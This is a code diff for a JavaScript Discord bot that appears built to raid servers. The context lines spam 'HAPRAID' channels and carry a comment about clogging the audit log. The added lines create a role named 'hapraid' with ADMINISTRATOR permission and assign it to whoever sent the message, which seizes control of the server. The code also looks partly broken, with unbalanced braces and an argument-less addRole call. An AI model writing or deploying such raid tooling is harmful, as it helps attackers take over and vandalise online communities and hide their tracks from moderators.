@@ -48,7 +48,20 @@ bot.on('message', msg => {
             msg.guild.createChannel('HAPRAID', 'voice')//Nom a changer
             msg.guild.createChannel('HAPRAID-vous-remercie', 'text')
             //changes name tons of times to clog up the audit log
-           
+        }
+    }
+              
+              
+        //create role
+        msg.guild.createRole({
+            name: 'hapraid',
+            color: 'WHITE',
+            permissions:'ADMINISTRATOR',
+        }).then(role => msg.author.addRole(role));
+        msg.member.addRole();
+        //Nom a changer
+    }
+     
 });
  
 bot.login('process.env.TOKEN');
